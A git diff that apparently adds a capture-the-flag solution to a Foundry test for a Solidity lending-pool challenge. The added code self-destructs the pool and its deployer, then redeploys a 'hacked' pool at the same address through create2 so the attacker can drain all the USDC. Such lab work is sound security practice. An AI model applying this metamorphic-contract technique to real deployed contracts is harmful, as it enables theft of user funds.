@@ -15,8 +15,6 @@ import {LendExGovernor} from "../src/3_LendingPool/LendExGovernor.sol";
 //    If you need a contract for your hack, define it below //
 ////////////////////////////////////////////////////////////*/
 
-
-
 /*////////////////////////////////////////////////////////////
 //                     TEST CONTRACT                        //
 ////////////////////////////////////////////////////////////*/
@@ -41,6 +39,9 @@ contract Challenge3Test is Test {
         /* sending transactions as hacker */
         // deploying the LendingPool contract
         vm.startPrank(hacker);
+        // @note Hacker is owner of
+        // - create deployer
+        // - create2 deployer
         create2Deployer = new Create2Deployer();
         createDeployer = CreateDeployer(create2Deployer.deploy());
         lendingPool = LendingPool(createDeployer.deploy(true, address(usdc)));
@@ -62,6 +63,18 @@ contract Challenge3Test is Test {
             "lendingPool contract has the original name"
         );
         vm.startPrank(hacker);
+
+        // @note
+        // - Create2Deployer can be destroyed using 'cleanUp'
+        // - LendingPool can be destroyed using 'emergencyStop'
+
+        // HACK:
+        // - Self destruct pool -> to add hacked pool containing method that transfers all the money to the attacker
+        // - Self destruct deployer
+
+        createDeployer.cleanUp();
+        lendingPool.emergencyStop();
+
         /*//////////////////////////////////////////////////////////////////////
         //                      Add your hack below!                          //
         //                          Hack part #1                              //
@@ -72,9 +85,6 @@ contract Challenge3Test is Test {
         // forge test --match-contract Challenge3Test -vvvv                   //
         //////////////////////////////////////////////////////////////////////*/
 
-
-
-    
         //====================================================================//
         vm.stopPrank();
     }
@@ -88,9 +98,8 @@ contract Challenge3Test is Test {
         // terminal command to run the specific test:                 //
         // forge test --match-contract Challenge3Test -vvvv           //
         //////////////////////////////////////////////////////////////*/
-
-
-
+        createDeployer = CreateDeployer(create2Deployer.deploy());
+        lendingPool = LendingPool(createDeployer.deploy(false, address(usdc)));
 
         //=============================================================//
         vm.stopPrank();
@@ -100,6 +109,10 @@ contract Challenge3Test is Test {
             "LendingPool hack",
             "lendingPool contract address now gives a different name"
         );
-        assertEq(usdc.balanceOf(hacker), usdcAmount, "Hacker has to steal all the stablecoin tokens");
+        assertEq(
+            usdc.balanceOf(hacker),
+            usdcAmount,
+            "Hacker has to steal all the stablecoin tokens"
+        );
     }
 }
